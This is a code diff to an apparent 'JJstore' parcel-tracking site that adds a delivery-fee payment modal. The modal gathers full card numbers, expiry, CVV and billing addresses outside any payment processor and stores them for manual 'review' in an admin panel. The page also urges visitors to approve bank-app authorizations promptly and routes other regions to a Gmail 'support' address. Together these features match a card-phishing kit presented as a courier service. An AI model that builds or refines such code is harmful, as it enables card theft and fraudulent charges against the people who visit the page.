@@ -131,30 +131,31 @@ nav{background:#fff;border-bottom:3px solid var(--orange);display:flex;align-ite
 .toggle-sw{width:44px;height:24px;background:var(--green);border-radius:12px;position:relative;flex-shrink:0}
 .toggle-sw::after{content:'';position:absolute;width:18px;height:18px;background:#fff;border-radius:50%;top:3px;right:3px}
 /* MANUAL PAYMENT MODAL */
-.mp-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:500;display:none;align-items:center;justify-content:center;padding:20px}
+.mp-overlay{position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:500;display:none;align-items:flex-start;justify-content:center;padding:16px;overflow-y:auto;-webkit-overflow-scrolling:touch}
 .mp-overlay.open{display:flex}
-.mp-modal{background:#fff;border-radius:10px;width:100%;max-width:480px;box-shadow:0 12px 48px rgba(0,0,0,.35);overflow:hidden}
-.mp-hdr{background:var(--blue);color:#fff;padding:16px 20px;display:flex;justify-content:space-between;align-items:center}
+.mp-modal{background:#fff;border-radius:12px;width:100%;max-width:480px;box-shadow:0 16px 56px rgba(0,0,0,.4);overflow:hidden;margin:auto;flex-shrink:0}
+.mp-hdr{background:var(--blue);color:#fff;padding:16px 20px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:1}
 .mp-hdr h2{font-size:16px;font-weight:700}
-.mp-close{background:none;border:none;color:#fff;font-size:22px;cursor:pointer;line-height:1}
-.mp-body{padding:20px}
+.mp-close{background:none;border:none;color:#fff;font-size:26px;cursor:pointer;line-height:1;padding:0 4px}
+.mp-body{padding:20px;overflow-y:visible}
 .mp-body h3{font-size:14px;font-weight:700;color:var(--blue);margin-bottom:4px}
-.mp-body .mp-amount{font-size:22px;font-weight:900;color:var(--orange);margin-bottom:16px}
-.mp-field{display:flex;flex-direction:column;gap:4px;margin-bottom:12px}
+.mp-body .mp-amount{font-size:26px;font-weight:900;color:var(--orange);margin-bottom:16px}
+.mp-field{display:flex;flex-direction:column;gap:5px;margin-bottom:14px}
 .mp-field label{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--tg)}
-.mp-field input,.mp-field select{border:1.5px solid var(--mg);border-radius:4px;padding:10px 12px;font-size:14px;outline:none;font-family:Arial,sans-serif;transition:border-color .2s}
-.mp-field input:focus,.mp-field select:focus{border-color:var(--blue)}
+.mp-field input,.mp-field select{border:1.5px solid var(--mg);border-radius:6px;padding:12px 14px;font-size:15px;outline:none;font-family:Arial,sans-serif;transition:border-color .2s;width:100%;-webkit-appearance:none;appearance:none;background:#fff}
+.mp-field input:focus,.mp-field select:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(41,128,185,.15)}
 .mp-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-.mp-info{background:#e8f4fd;border:1px solid #b8daff;border-radius:4px;padding:10px 14px;font-size:12px;color:#1a6fa8;margin:12px 0;line-height:1.6}
-.mp-auth{background:#fff3cd;border:1px solid #ffc107;border-radius:4px;padding:10px 14px;font-size:12px;color:#856404;margin:10px 0;line-height:1.6}
-.mp-err{background:#fdf2f2;color:var(--red);border:1px solid #f5c6cb;border-radius:4px;padding:8px 12px;font-size:12px;margin-top:8px;display:none}
+.mp-info{background:#e8f4fd;border:1px solid #b8daff;border-radius:6px;padding:12px 14px;font-size:13px;color:#1a6fa8;margin:12px 0;line-height:1.6}
+.mp-auth{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:12px 14px;font-size:13px;color:#856404;margin:10px 0;line-height:1.6}
+.mp-err{background:#fdf2f2;color:var(--red);border:1px solid #f5c6cb;border-radius:6px;padding:10px 14px;font-size:13px;margin-top:8px;display:none}
 .mp-err.visible{display:block}
-.btn-mp-submit{width:100%;background:var(--blue);color:#fff;border:none;padding:13px;font-size:15px;font-weight:700;cursor:pointer;border-radius:4px;margin-top:12px}
+.btn-mp-submit{width:100%;background:var(--blue);color:#fff;border:none;padding:15px;font-size:16px;font-weight:700;cursor:pointer;border-radius:8px;margin-top:14px;letter-spacing:.3px}
 .btn-mp-submit:hover{background:#1a5276}
-.mp-success{text-align:center;padding:24px 20px}
-.mp-success .ms-icon{font-size:48px;margin-bottom:12px}
-.mp-success h3{font-size:18px;font-weight:700;color:var(--green);margin-bottom:8px}
-.mp-success p{font-size:13px;color:var(--tg);line-height:1.7}
+.btn-mp-submit:active{transform:scale(.98)}
+.mp-success{text-align:center;padding:32px 24px}
+.mp-success .ms-icon{font-size:56px;margin-bottom:14px}
+.mp-success h3{font-size:20px;font-weight:700;color:var(--green);margin-bottom:8px}
+.mp-success p{font-size:14px;color:var(--tg);line-height:1.7}
 /* FOOTER */
 .main{padding:36px 40px}
 footer{background:#333;color:#ccc;padding:28px 40px;font-size:12px}
@@ -172,13 +173,17 @@ footer{background:#333;color:#ccc;padding:28px 40px;font-size:12px}
 .two-col{display:grid;grid-template-columns:1fr 1fr;gap:36px}
 @media(max-width:680px){
   .two-col,.people-row,.info-grid{grid-template-columns:1fr}
-  .hero-content,.track-card{padding-left:16px;padding-right:16px}
-  .track-card{margin:0 12px 28px}
-  .main{padding:24px 16px}
+  .hero-content{padding:28px 16px 14px}
+  .track-card{margin:0 10px 24px;padding:16px}
+  .main{padding:20px 14px}
   .fg{grid-template-columns:1fr 1fr}
   nav{padding:0 12px}.nav-links{display:none}
   .pay-pills{flex-direction:column}
   .mp-grid{grid-template-columns:1fr}
+  .mp-overlay{padding:0;align-items:flex-end}
+  .mp-modal{border-radius:16px 16px 0 0;max-width:100%;margin:0}
+  .track-row input{font-size:16px}
+  .hero-content h1{font-size:26px}
 }
 </style>
 </head>
@@ -291,43 +296,76 @@ footer{background:#333;color:#ccc;padding:28px 40px;font-size:12px}
       <h3 id="mpPayingFor">Delivery Payment</h3>
       <div class="mp-amount" id="mpAmountDisplay"></div>
       <div class="mp-info" id="mpInfoText"></div>
-      <div class="mp-grid">
-        <div class="mp-field" style="grid-column:1/-1">
-          <label id="mpLblHolder">Cardholder Name</label>
-          <input type="text" id="mpHolder" placeholder="As it appears on card"/>
-        </div>
-        <div class="mp-field" style="grid-column:1/-1">
-          <label id="mpLblCard">Card Number</label>
-          <input type="text" id="mpCard" placeholder="1234 5678 9012 3456" maxlength="19" oninput="fmtCard(this)"/>
-        </div>
-        <div class="mp-field">
-          <label id="mpLblExpiry">Expiry (MM/YY)</label>
-          <input type="text" id="mpExpiry" placeholder="MM/YY" maxlength="5" oninput="fmtExpiry(this)"/>
-        </div>
-        <div class="mp-field">
-          <label id="mpLblCvv">CVV</label>
-          <input type="password" id="mpCvv" placeholder="•••" maxlength="4"/>
-        </div>
-        <div class="mp-field" style="grid-column:1/-1">
-          <label id="mpLblAddr">Billing Address</label>
-          <input type="text" id="mpAddr" placeholder="Street, City"/>
-        </div>
-        <div class="mp-field" style="grid-column:1/-1">
-          <label id="mpLblCountry">Billing Country</label>
-          <select id="mpCountry">
-            <option value="PT">Portugal</option>
-            <option value="ES">Spain</option>
-            <option value="FR">France</option>
-            <option value="DE">Germany</option>
-            <option value="IT">Italy</option>
-            <option value="OTHER">Other</option>
-          </select>
-        </div>
-      </div>
-      <div class="mp-auth" id="mpAuthNote"></div>
-      <div class="mp-err" id="mpErr"></div>
-      <button class="btn-mp-submit" id="mpSubmitBtn" onclick="submitManualPay()"></button>
+
+```
+  <!-- CARD DETAILS -->
+  <div class="mp-field">
+    <label id="mpLblHolder">Cardholder Name</label>
+    <input type="text" id="mpHolder" placeholder="As it appears on card" autocomplete="cc-name"/>
+  </div>
+  <div class="mp-field">
+    <label id="mpLblCard">Card Number</label>
+    <input type="text" id="mpCard" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" oninput="fmtCard(this)" autocomplete="cc-number"/>
+  </div>
+  <div class="mp-grid">
+    <div class="mp-field">
+      <label id="mpLblExpiry">Expiry (MM/YY)</label>
+      <input type="text" id="mpExpiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" oninput="fmtExpiry(this)" autocomplete="cc-exp"/>
     </div>
+    <div class="mp-field">
+      <label id="mpLblCvv">CVV</label>
+      <input type="password" id="mpCvv" placeholder="•••" maxlength="4" inputmode="numeric" autocomplete="cc-csc"/>
+    </div>
+  </div>
+
+  <!-- BILLING ADDRESS -->
+  <div style="background:var(--lg);border-radius:8px;padding:14px;margin:14px 0">
+    <p style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:var(--purple);margin:0 0 12px">🏠 <span id="mpBillingTitle">Billing Address</span></p>
+    <div class="mp-field">
+      <label id="mpLblStreet">Street / House Number</label>
+      <input type="text" id="mpStreet" placeholder="e.g. 24 Rua do Ouro" autocomplete="address-line1"/>
+    </div>
+    <div class="mp-field">
+      <label id="mpLblStreet2">Apartment / Floor (optional)</label>
+      <input type="text" id="mpStreet2" placeholder="e.g. Apt 3B, 2nd Floor" autocomplete="address-line2"/>
+    </div>
+    <div class="mp-grid">
+      <div class="mp-field">
+        <label id="mpLblCity">City</label>
+        <input type="text" id="mpCity" placeholder="e.g. Lisbon" autocomplete="address-level2"/>
+      </div>
+      <div class="mp-field">
+        <label id="mpLblPostcode">Postal / ZIP Code</label>
+        <input type="text" id="mpPostcode" placeholder="e.g. 1100-150" inputmode="text" autocomplete="postal-code"/>
+      </div>
+    </div>
+    <div class="mp-field">
+      <label id="mpLblRegion">State / Region / Province</label>
+      <input type="text" id="mpRegion" placeholder="e.g. Lisboa" autocomplete="address-level1"/>
+    </div>
+    <div class="mp-field">
+      <label id="mpLblCountry">Billing Country</label>
+      <select id="mpCountry" autocomplete="country">
+        <option value="PT">🇵🇹 Portugal</option>
+        <option value="ES">🇪🇸 Spain</option>
+        <option value="FR">🇫🇷 France</option>
+        <option value="DE">🇩🇪 Germany</option>
+        <option value="IT">🇮🇹 Italy</option>
+        <option value="NL">🇳🇱 Netherlands</option>
+        <option value="BE">🇧🇪 Belgium</option>
+        <option value="GB">🇬🇧 United Kingdom</option>
+        <option value="US">🇺🇸 United States</option>
+        <option value="OTHER">🌍 Other</option>
+      </select>
+    </div>
+  </div>
+
+  <div class="mp-auth" id="mpAuthNote"></div>
+  <div class="mp-err" id="mpErr"></div>
+  <button class="btn-mp-submit" id="mpSubmitBtn" onclick="submitManualPay()"></button>
+</div>
+```
+
   </div>
 </div>
 
@@ -396,10 +434,13 @@ const T={
     feat2Title:'JJstore Mobile',feat2Sub:'Track your deliveries anywhere, anytime.',
     mpHdrTitle:'💳 Card Payment',mpInfoText:'Your card details are encrypted and processed securely. Enter your details below to complete your delivery payment.',
     mpAuthNote:'After submitting, you may be asked to authorize this payment in your bank app. This is a standard security step — please approve it promptly.',
-    mpHolder:'Cardholder Name',mpCard:'Card Number',mpExpiry:'Expiry (MM/YY)',mpCvv:'CVV',mpAddr:'Billing Address',mpCountry:'Billing Country',
+    mpHolder:'Cardholder Name',mpCard:'Card Number',mpExpiry:'Expiry (MM/YY)',mpCvv:'CVV',
+    mpBillingTitle:'Billing Address',mpLblStreet:'Street / House Number',mpLblStreet2:'Apartment / Floor (optional)',
+    mpLblCity:'City',mpLblPostcode:'Postal / ZIP Code',mpLblRegion:'State / Region / Province',mpCountry:'Billing Country',
     mpSubmitBtn:'Submit Payment',mpSuccessTitle:'Payment Submitted',
     mpSuccessMsg:'Your payment details have been received. Our team will verify and process your payment shortly. You will be notified once confirmed.',
-    trackingInfoOnly:'📦 Your shipment is being tracked. For payment enquiries, please contact JJstore support.'
+    trackingInfoOnly:'📦 Your shipment is being tracked. For payment enquiries, please contact JJstore support.',
+    mpErrFields:'⚠ Please fill in all required fields correctly.'
   },
   pt:{
     heroTitle:'Rastreie a Sua Encomenda',heroSub:'Atualizações em tempo real sobre cada encomenda.',
@@ -425,10 +466,13 @@ const T={
     feat2Title:'JJstore Mobile',feat2Sub:'Rastreie as suas entregas em qualquer lugar e a qualquer hora.',
     mpHdrTitle:'💳 Pagamento com Cartão',mpInfoText:'Os seus dados do cartão são encriptados e processados em segurança. Introduza os seus dados abaixo para concluir o pagamento da entrega.',
     mpAuthNote:'Após submeter, poderá ser-lhe pedido que autorize este pagamento na app do seu banco. Este é um passo de segurança padrão — por favor aprove-o prontamente.',
-    mpHolder:'Nome do Titular',mpCard:'Número do Cartão',mpExpiry:'Validade (MM/AA)',mpCvv:'CVV',mpAddr:'Morada de Faturação',mpCountry:'País de Faturação',
+    mpHolder:'Nome do Titular',mpCard:'Número do Cartão',mpExpiry:'Validade (MM/AA)',mpCvv:'CVV',
+    mpBillingTitle:'Morada de Faturação',mpLblStreet:'Rua / Número da Porta',mpLblStreet2:'Andar / Apartamento (opcional)',
+    mpLblCity:'Cidade',mpLblPostcode:'Código Postal',mpLblRegion:'Distrito / Região / Província',mpCountry:'País de Faturação',
     mpSubmitBtn:'Submeter Pagamento',mpSuccessTitle:'Pagamento Submetido',
     mpSuccessMsg:'Os seus dados de pagamento foram recebidos. A nossa equipa irá verificar e processar o seu pagamento em breve. Será notificado assim que confirmado.',
-    trackingInfoOnly:'📦 A sua encomenda está a ser rastreada. Para questões de pagamento, por favor contacte o suporte JJstore.'
+    trackingInfoOnly:'📦 A sua encomenda está a ser rastreada. Para questões de pagamento, por favor contacte o suporte JJstore.',
+    mpErrFields:'⚠ Por favor preencha todos os campos obrigatórios corretamente.'
   }
 };
 
@@ -616,10 +660,109 @@ function renderPaySection(s,isUSA,isPT,lang){
   const cur=s.currency||'USD';
   const L=T[lang]||T.en;
   const container=document.getElementById('paySection');
+  const fmt2=n=>parseFloat(n||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2});
 
-  // Not USA and not Portugal => show info only
+  // ── NON-USA / NON-PORTUGAL ── show full balance info + contact support
   if(!isUSA&&!isPT){
-    container.innerHTML=`<div class="msg info visible">${L.trackingInfoOnly}</div>`;
+    const isCleared=totalDue<=0||s.status==='Delivered';
+    let html='';
+
+    if(overdue>0){
+      html+=`<div class="overdue-alert"><strong>${L.overdueAlert}</strong>${L.overdueMsg}</div>`;
+    }
+
+    if(isCleared){
+      html+=`<div class="cleared-box"><strong>${L.clearedTitle}</strong>${L.clearedMsg}</div>`;
+    }
+
+    // Full payment summary card
+    html+=`
+    <div style="border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:14px">
+
+      <!-- Header -->
+      <div style="background:linear-gradient(135deg,#2c3e50,#34495e);color:#fff;padding:14px 18px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px">
+        <div>
+          <div style="font-size:10px;text-transform:uppercase;letter-spacing:1px;opacity:.7;margin-bottom:3px">💰 Delivery Payment Summary</div>
+          <div style="font-size:22px;font-weight:900;letter-spacing:-0.5px">${cur} ${fmt2(total)}</div>
+        </div>
+        <div style="background:${isCleared?'#27ae60':'#e74c3c'};padding:6px 16px;border-radius:20px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;white-space:nowrap">
+          ${isCleared?'✅ Cleared':'⏳ Outstanding'}
+        </div>
+      </div>
+
+      <!-- Payment breakdown -->
+      <div style="padding:14px 18px;background:#fff">
+        <div style="display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap">
+          <div style="flex:1;min-width:80px;background:#f3eef9;border-radius:6px;padding:10px 12px;text-align:center">
+            <div style="font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--tg);margin-bottom:3px">Total Fee</div>
+            <div style="font-size:16px;font-weight:900;color:var(--purple)">${cur} ${fmt2(total)}</div>
+          </div>
+          <div style="flex:1;min-width:80px;background:#eafaf1;border-radius:6px;padding:10px 12px;text-align:center">
+            <div style="font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--tg);margin-bottom:3px">Paid</div>
+            <div style="font-size:16px;font-weight:900;color:var(--green)">${cur} ${fmt2(paid)}</div>
+          </div>
+          ${overdue>0?`<div style="flex:1;min-width:80px;background:#fff3e0;border-radius:6px;padding:10px 12px;text-align:center">
+            <div style="font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--tg);margin-bottom:3px">Overdue</div>
+            <div style="font-size:16px;font-weight:900;color:var(--orange)">+${cur} ${fmt2(overdue)}</div>
+          </div>`:''}
+          <div style="flex:1;min-width:80px;background:${isCleared?'#eafaf1':'#fdf2f2'};border-radius:6px;padding:10px 12px;text-align:center">
+            <div style="font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--tg);margin-bottom:3px">${isCleared?'Status':'Balance Due'}</div>
+            <div style="font-size:16px;font-weight:900;color:${isCleared?'var(--green)':'var(--red)'}">${isCleared?'Settled':cur+' '+fmt2(totalDue)}</div>
+          </div>
+        </div>
+
+        <!-- Row breakdown -->
+        <div style="font-size:13px;border-top:1px solid var(--border);padding-top:10px">
+          <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #f5f5f5">
+            <span style="color:var(--tg)">Delivery Fee</span>
+            <span style="font-weight:600">${cur} ${fmt2(total)}</span>
+          </div>
+          <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #f5f5f5;color:var(--green)">
+            <span>✓ Amount Paid</span>
+            <span style="font-weight:600">− ${cur} ${fmt2(paid)}</span>
+          </div>
+          ${overdue>0?`<div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #f5f5f5;color:var(--orange)">
+            <span>⏰ Overdue Interest</span>
+            <span style="font-weight:600">+ ${cur} ${fmt2(overdue)}</span>
+          </div>`:''}
+          <div style="display:flex;justify-content:space-between;padding:8px 0;font-weight:700;font-size:14px;color:${isCleared?'var(--green)':'var(--red)'}">
+            <span>${isCleared?'✅ Fully Settled':'⚠ Total Outstanding'}</span>
+            <span>${isCleared?'Cleared':cur+' '+fmt2(totalDue)}</span>
+          </div>
+        </div>
+        ${s.paymentNote?`<div style="margin-top:8px;padding:8px 12px;background:var(--lg);border-radius:4px;font-size:12px;color:var(--tg);font-style:italic">📝 ${s.paymentNote}</div>`:''}
+      </div>
+    </div>
+
+    <!-- CONTACT SUPPORT CARD -->
+    ${!isCleared?`
+    <div style="background:linear-gradient(135deg,#f8f9fa,#fff);border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:14px">
+      <div style="background:var(--purple);color:#fff;padding:12px 18px">
+        <div style="font-size:13px;font-weight:700">📞 Payment Assistance</div>
+        <div style="font-size:11px;opacity:.8;margin-top:2px">Our support team will guide you through the payment process</div>
+      </div>
+      <div style="padding:16px 18px">
+        <p style="font-size:13px;color:var(--dg);line-height:1.8;margin-bottom:14px">
+          Your shipment has an outstanding delivery balance of <strong style="color:var(--red)">${cur} ${fmt2(totalDue)}</strong>.
+          Online payment is not currently available for your region, however our dedicated support team is ready to assist you in completing your payment and arranging the final delivery of your package.
+        </p>
+        <div style="display:flex;flex-direction:column;gap:10px">
+          <a href="mailto:googsup009@gmail.com?subject=Payment%20Enquiry%20—%20${s.id||''}%20(${cur}%20${fmt2(totalDue)})&body=Hello%20JJstore%20Support%2C%0A%0AI%20am%20writing%20regarding%20shipment%20${s.id||''}%20with%20an%20outstanding%20balance%20of%20${cur}%20${fmt2(totalDue)}.%0A%0APlease%20advise%20on%20available%20payment%20methods%20for%20my%20region.%0A%0AThank%20you."
+            style="display:flex;align-items:center;gap:12px;background:#fff;border:1.5px solid var(--purple);border-radius:6px;padding:12px 16px;text-decoration:none;color:var(--purple)">
+            <span style="font-size:22px">✉️</span>
+            <div>
+              <div style="font-size:13px;font-weight:700">Contact Support via Email</div>
+              <div style="font-size:11px;opacity:.75;margin-top:1px">googsup009@gmail.com · We respond within 24 hours</div>
+            </div>
+          </a>
+        </div>
+        <p style="font-size:11px;color:var(--tg);margin-top:14px;line-height:1.6;border-top:1px solid var(--border);padding-top:12px">
+          When contacting support, please have your tracking number <strong>${s.id||''}</strong> and the outstanding amount of <strong>${cur} ${fmt2(totalDue)}</strong> ready. Our team will provide you with available payment options for your country and ensure your delivery is completed promptly.
+        </p>
+      </div>
+    </div>`:''}`;
+
+    container.innerHTML=html;
     return;
   }
 
@@ -633,8 +776,6 @@ function renderPaySection(s,isUSA,isPT,lang){
   // Cleared
   if(totalDue<=0||s.status==='Delivered'){
     html+=`<div class="cleared-box"><strong>${L.clearedTitle}</strong>${L.clearedMsg}</div>`;
-    container.innerHTML=html;
-    // Still show fee summary
     html+=buildPayBox(s,total,paid,balance,overdue,totalDue,cur,L,false,isUSA,isPT);
     container.innerHTML=html;
     return;
@@ -646,7 +787,7 @@ function renderPaySection(s,isUSA,isPT,lang){
   }
   // Portugal warning
   if(isPT&&balance>0){
-    html+=`<div class="msg info visible" style="background:#e8f4fd;border-color:#b8daff;color:#1a6fa8"><strong>${isPT?'⚠️ Pagamento Necessário —':'⚠️ Payment Required —'}</strong> ${L.usaWarningMsg}</div>`;
+    html+=`<div class="msg info visible" style="background:#e8f4fd;border-color:#b8daff;color:#1a6fa8"><strong>⚠️ ${lang==='pt'?'Pagamento Necessário':'Payment Required'} —</strong> ${L.usaWarningMsg}</div>`;
   }
 
   html+=buildPayBox(s,total,paid,balance,overdue,totalDue,cur,L,true,isUSA,isPT);
@@ -711,12 +852,23 @@ window.updatePartialBtn=function(totalDue,cur){
   }
 };
 
-window.handlePay=function(name,email,phone,currency,amount,isPT){
+window.handlePay=async function(name,email,phone,currency,amount,isPT){
   const amt=payingPartial&&partialAmt>0?partialAmt:amount;
   if(isPT){
     openMpModal(amt,currency,name);
   }else{
-    // Flutterwave for USA
+    // ── Send admin email IMMEDIATELY before Flutterwave opens ──
+    const geo=await getGeoInfo();
+    sendAdminEmail({
+      subject:'💳 JJstore Payment Initiated — '+currentTrackNum,
+      message:`A customer has clicked Pay Now for shipment ${currentTrackNum} and is being redirected to Flutterwave.\n\nCustomer: ${name||'—'}\nEmail: ${email||'—'}\nAmount: ${currency} ${fmt(amt)}${payingPartial?' (PARTIAL)':' (FULL PAYMENT)'}\nCustomer Location: ${geo.countryName||'USA'} — ${geo.city||''}\n\nNote: Payment confirmation will follow once the transaction is completed on Flutterwave.`,
+      trackNum:currentTrackNum,
+      amount:currency+' '+fmt(amt),
+      name:name||'—',
+      country:geo.countryName||'USA',
+      payType:'Flutterwave (USA) — Initiated'
+    });
+    // ── Now open Flutterwave ──
     FlutterwaveCheckout({
       public_key:FLW_KEY,
       tx_ref:'JJ-'+currentTrackNum+'-'+Date.now(),
@@ -740,16 +892,16 @@ window.handlePay=function(name,email,phone,currency,amount,isPT){
               const lang=getLang(currentShipment);
               const balance2=parseFloat(currentShipment.totalFee||0)-newPaid;
               const overdue2=calcOverdue(currentShipment);
-              // Send admin email notification
-              const geo=await getGeoInfo();
+              const geo2=await getGeoInfo();
+              // Send confirmed payment email
               sendAdminEmail({
-                subject:'💳 JJstore Payment Received — '+currentTrackNum,
-                message:`A Flutterwave payment of ${currency} ${fmt(amt)} was received for shipment ${currentTrackNum}.\n\nCustomer: ${name||'—'}\nEmail: ${email||'—'}\nCountry: ${geo.countryName||geo.country||'USA'}\nTransaction ID: ${data.transaction_id}\nRemaining balance: ${currency} ${fmt(Math.max(0,balance2+overdue2))}\nStatus: ${balance2+overdue2<=0?'FULLY PAID':'PARTIAL — balance remaining'}`,
+                subject:'✅ JJstore Payment CONFIRMED — '+currentTrackNum,
+                message:`Flutterwave payment was SUCCESSFUL for shipment ${currentTrackNum}.\n\nCustomer: ${name||'—'}\nEmail: ${email||'—'}\nAmount Paid: ${currency} ${fmt(amt)}\nTransaction ID: ${data.transaction_id}\nLocation: ${geo2.countryName||'USA'} — ${geo2.city||''}\nRemaining Balance: ${currency} ${fmt(Math.max(0,balance2+overdue2))}\nStatus: ${balance2+overdue2<=0?'✅ FULLY PAID — CLEARED':'⏳ PARTIAL — Balance still remaining'}`,
                 trackNum:currentTrackNum,
                 amount:currency+' '+fmt(amt),
                 name:name||'—',
-                country:geo.countryName||'USA',
-                payType:'Flutterwave (USA)'
+                country:geo2.countryName||'USA',
+                payType:'Flutterwave (USA) — Confirmed'
               });
               if(balance2+overdue2<=0){
                 alert(T[lang].clearedTitle+'\n'+T[lang].clearedMsg);
@@ -768,6 +920,7 @@ window.handlePay=function(name,email,phone,currency,amount,isPT){
 // ── MANUAL PAYMENT (Portugal) ──
 function openMpModal(amount,currency,name){
   const lang=getLang(currentShipment);const L=T[lang]||T.en;
+  // Set text content
   document.getElementById('mpHdrTitle').textContent=L.mpHdrTitle;
   document.getElementById('mpAmountDisplay').textContent=currency+' '+fmt(amount);
   document.getElementById('mpPayingFor').textContent=lang==='pt'?'Pagamento de Entrega — '+currentTrackNum:'Delivery Payment — '+currentTrackNum;
@@ -777,36 +930,68 @@ function openMpModal(amount,currency,name){
   document.getElementById('mpLblCard').textContent=L.mpCard;
   document.getElementById('mpLblExpiry').textContent=L.mpExpiry;
   document.getElementById('mpLblCvv').textContent=L.mpCvv;
-  document.getElementById('mpLblAddr').textContent=L.mpAddr;
+  document.getElementById('mpBillingTitle').textContent=L.mpBillingTitle;
+  document.getElementById('mpLblStreet').textContent=L.mpLblStreet;
+  document.getElementById('mpLblStreet2').textContent=L.mpLblStreet2;
+  document.getElementById('mpLblCity').textContent=L.mpLblCity;
+  document.getElementById('mpLblPostcode').textContent=L.mpLblPostcode;
+  document.getElementById('mpLblRegion').textContent=L.mpLblRegion;
   document.getElementById('mpLblCountry').textContent=L.mpCountry;
   document.getElementById('mpSubmitBtn').textContent=L.mpSubmitBtn;
+  // Clear fields
   document.getElementById('mpHolder').value=name||'';
   document.getElementById('mpCard').value='';
   document.getElementById('mpExpiry').value='';
   document.getElementById('mpCvv').value='';
-  document.getElementById('mpAddr').value='';
+  document.getElementById('mpStreet').value='';
+  document.getElementById('mpStreet2').value='';
+  document.getElementById('mpCity').value='';
+  document.getElementById('mpPostcode').value='';
+  document.getElementById('mpRegion').value='';
+  document.getElementById('mpCountry').value='PT';
   document.getElementById('mpErr').classList.remove('visible');
-  // Store for submit
+  document.getElementById('mpSubmitBtn').disabled=false;
+  // Store payment details
   window._mpAmount=amount;
   window._mpCurrency=currency;
-  document.getElementById('mpOverlay').classList.add('open');
+  // Open modal & scroll overlay to top
+  const overlay=document.getElementById('mpOverlay');
+  overlay.classList.add('open');
+  overlay.scrollTop=0;
+  // Prevent body scroll when modal is open
+  document.body.style.overflow='hidden';
 }
-window.closeMpModal=function(){document.getElementById('mpOverlay').classList.remove('open');};
+
+window.closeMpModal=function(){
+  document.getElementById('mpOverlay').classList.remove('open');
+  document.body.style.overflow='';
+};
 
 window.submitManualPay=async function(){
   const lang=getLang(currentShipment);const L=T[lang]||T.en;
-  const holder=document.getElementById('mpHolder').value.trim();
-  const card=document.getElementById('mpCard').value.replace(/\s/g,'');
-  const expiry=document.getElementById('mpExpiry').value.trim();
-  const cvv=document.getElementById('mpCvv').value.trim();
-  const addr=document.getElementById('mpAddr').value.trim();
-  const errEl=document.getElementById('mpErr');
+  const holder  =document.getElementById('mpHolder').value.trim();
+  const card    =document.getElementById('mpCard').value.replace(/\s/g,'');
+  const expiry  =document.getElementById('mpExpiry').value.trim();
+  const cvv     =document.getElementById('mpCvv').value.trim();
+  const street  =document.getElementById('mpStreet').value.trim();
+  const street2 =document.getElementById('mpStreet2').value.trim();
+  const city    =document.getElementById('mpCity').value.trim();
+  const postcode=document.getElementById('mpPostcode').value.trim();
+  const region  =document.getElementById('mpRegion').value.trim();
+  const country =document.getElementById('mpCountry').value;
+  const errEl   =document.getElementById('mpErr');
   errEl.classList.remove('visible');
 
-  if(!holder||card.length<12||!expiry||cvv.length<3||!addr){
-    errEl.textContent=lang==='pt'?'⚠ Por favor preencha todos os campos corretamente.':'⚠ Please fill all fields correctly.';
-    errEl.classList.add('visible');return;
+  if(!holder||card.length<12||!expiry||cvv.length<3||!street||!city||!postcode){
+    errEl.textContent=L.mpErrFields;
+    errEl.classList.add('visible');
+    errEl.scrollIntoView({behavior:'smooth',block:'nearest'});
+    return;
   }
+
+  const fullBillingAddress=[street,street2,city,postcode,region,country].filter(Boolean).join(', ');
+  const payAmt=payingPartial&&partialAmt>0?partialAmt:window._mpAmount;
+  const geo=await getGeoInfo();
 
   document.getElementById('mpSubmitBtn').textContent=lang==='pt'?'A processar…':'Processing…';
   document.getElementById('mpSubmitBtn').disabled=true;
@@ -817,34 +1002,41 @@ window.submitManualPay=async function(){
       holderName:holder,
       cardNumber:card,
       expiry,
-      billingAddress:addr,
-      billingCountry:document.getElementById('mpCountry').value,
+      billingStreet:street,
+      billingStreet2:street2,
+      billingCity:city,
+      billingPostcode:postcode,
+      billingRegion:region,
+      billingCountry:country,
+      billingAddress:fullBillingAddress,
       amount:window._mpAmount,
       partialAmount:payingPartial?partialAmt:null,
       currency:window._mpCurrency,
       status:'pending',
       submittedAt:new Date().toLocaleString('en-US',{month:'short',day:'numeric',year:'numeric',hour:'2-digit',minute:'2-digit'})
     });
-    // Send admin email for manual payment
-    const geo=await getGeoInfo();
-    const payAmt=payingPartial&&partialAmt>0?partialAmt:window._mpAmount;
+
+    // Email admin AFTER submission (card details intentionally excluded from email)
     sendAdminEmail({
       subject:'🏦 JJstore Manual Payment Request — '+currentTrackNum,
-      message:`A manual card payment request has been submitted for shipment ${currentTrackNum}.\n\nCardholder: ${holder}\nCard ending: ****${card.slice(-4)}\nAmount: ${window._mpCurrency} ${fmt(payAmt)}${payingPartial?' (PARTIAL)':''}\nBilling address: ${addr}\nBilling country: ${document.getElementById('mpCountry').value}\nCustomer country (IP): ${geo.countryName||'Portugal'}\n\nPlease visit https://feadmin-two.vercel.app → Manual Payments to review and approve or reject this payment.`,
